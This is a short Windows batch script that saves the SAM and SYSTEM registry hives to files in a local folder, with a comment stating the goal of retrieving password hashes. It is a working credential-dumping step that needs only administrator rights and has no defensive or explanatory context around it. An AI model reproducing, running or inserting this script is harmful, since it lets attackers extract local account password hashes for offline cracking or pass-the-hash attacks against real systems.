@echo off

:: Get Current Directory
set "currentDir=%~dp0"

:: change from the admin directory to current directory
cd %currentDir%bin\

:: retrieve the Pass Hash in the current directory
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save